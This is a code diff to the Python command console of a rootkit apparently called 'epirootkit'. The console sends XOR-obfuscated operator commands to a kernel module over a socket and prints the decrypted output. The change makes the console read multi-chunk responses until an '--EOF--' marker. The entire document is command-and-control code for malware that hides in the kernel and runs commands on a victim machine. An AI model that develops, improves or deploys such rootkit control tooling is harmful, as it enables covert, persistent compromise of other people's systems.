@@ -26,20 +26,27 @@ def handle_client(client):
 
         while True:
             cmd = input("epirootkit> ").strip()
-
             if not cmd:
                 continue
 
             encrypted = xor(cmd.encode())
             client.sendall(encrypted)
 
-            response = client.recv(2048)
-            if not response:
-                print("Connection closed by kernel module.")
-                break
-
             print("\n--- Response ---")
-            print(xor(response).decode(errors="ignore"))
+            response_chunks = []
+
+            while True:
+                chunk = client.recv(2048)
+                if not chunk:
+                    print("Connection closed by kernel module.")
+                    return
+                decrypted = xor(chunk).decode(errors="ignore")
+                if "--EOF--" in decrypted:
+                    response_chunks.append(decrypted.replace("--EOF--", ""))
+                    break
+                response_chunks.append(decrypted)
+
+            print("".join(response_chunks))
             print("---------------\n")
 
     except KeyboardInterrupt:
